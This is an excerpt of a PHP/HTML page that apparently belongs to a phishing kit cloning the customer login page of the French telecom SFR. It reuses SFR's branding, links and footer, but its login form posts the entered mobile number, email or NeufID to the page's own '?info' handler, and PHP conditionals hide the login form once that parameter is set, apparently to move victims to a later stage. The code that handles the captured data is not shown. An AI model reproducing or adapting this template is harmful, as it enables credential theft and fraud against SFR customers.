				...
				<div id="colR">
					...
					<div id="column-right">
						...
						<div class="block" id="style-first-block">
							...
							<h2 id="formTitle" <?php if(isset($_GET["info"])){echo " style='display:none'";}?>>Espace Client</h2>

							<div class="content-area" id="mire-form" <?php if(isset($_GET["info"])){echo " style='display:none'";}?>>

								<p class="notes">Numéro de ligne mobile, email ou NeufID</p>
								
								<form name="loginForm" id="loginForm" action="?info" method="post">
							...
							<div class="content-area" id="mire-items" data="sdfsd" <?php if(isset($_GET["info"])){echo " style='display:none'";}?> >
								
								<ul class="items-list">
									<li>
										<a href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_oubli-mdp" class="light-link rweb">Mot de passe oublié</a>
										<a href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check&amp;mobileMode=true#sfrclicid=EC_mire_oubli-mdp" class="light-link rmobile">Mot de passe oublié</a>
									</li>
									
									<li>
										<a href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_compte-ko" class="light-link rweb">Compte bloqué</a>
										<a href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check&amp;mobileMode=true#sfrclicid=EC_mire_compte-ko" class="light-link rmobile">Compte bloqué</a>
									</li>
									<li><a href="https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_oubli-id" class="light-link forgotId">Identifiant oublié</a></li>
									<li><a href="#" class="light-link firstAuthent">Première connexion</a></li>
								</ul>
							</div>
...
<div id="block-acte-urgence-v2" class="style-second-block"><div class="second-block-text"><h5>Mobile perdu ou volé, SIM bloquée</h5><a href="https://www.sfr.fr/procedures-urgence/actes-urgences.html#sfrclicid=EC_mire_actes-urgences" class="really-light-link">Accédez aux actes d'urgence</a></div></div>
		...
		<div id="footer"></div>
	</div><div id="RN_F" <?php if(isset($_GET["info"])){echo " style='display:none'";}?>><style>body{margin:0;height:initial;min-height:100%}.istRN *{margin:0;padding:0;box-sizing:initial}.istRN{width:100%}.istRN p{width:100%;max-width:984px;margin:0 auto;vertical-align:middle;font-family:Arial}.istRN a{text-decoration:none}.istRN.f{background:#3d3f3f;padding:20px 0;clear:both}.istRN.f p{height:20px;line-height:20px;text-align:left;font-size:12px;overflow:hidden}.istRN.f a{display:inline-block;padding:0 17px 0 20px;color:#fff;background:url(//static.s-sfr.fr/media/point-light-1.png) 0px 9px no-repeat}.istRN.f a.l{color:#fff}.istRN.f a.n{background:none}.istRN.f a:hover{text-decoration:underline;text-decoration-style:dashed}.istRN.f img{float:left;height:20px;margin:0 20px 0 0;border:0}@media only screen and (max-width:1024px){footer.istRN a{padding:0 9px 0 12px}}</style><div class="istRN f"><p><a class="n l" stat="logo-sfr" href="http://www.sfr.fr/?noRedirect=true"><img src="//static.s-sfr.fr/media/logo-3.jpg" alt="SFR">© 2017 SFR - www.sfr.fr</a><a class="n" stat="info-legale" href="http://www.sfr.fr/mentions-legales.html">Informations légales</a><a stat="plan" href="http://www.sfr.fr/plan-du-site.html">Plan du site</a><a stat="phishing" href="http://assistance.sfr.fr/internet_offre-services/securite/vrai-site-sfr-espace-client/fc-3212-80564">Phishing</a><a href="#" onclick="return window._eT&amp;&amp;_eT.CkML&amp;&amp;_eT.CkML()&amp;&amp;!1">Cookies</a><a stat="contenu-illicite" href="http://www.pointdecontact.net/contact.aspx">Signaler un contenu illicite</a><a href="http://www.sfr.com/" target="_blank">Groupe SFR</a></p></div></div>
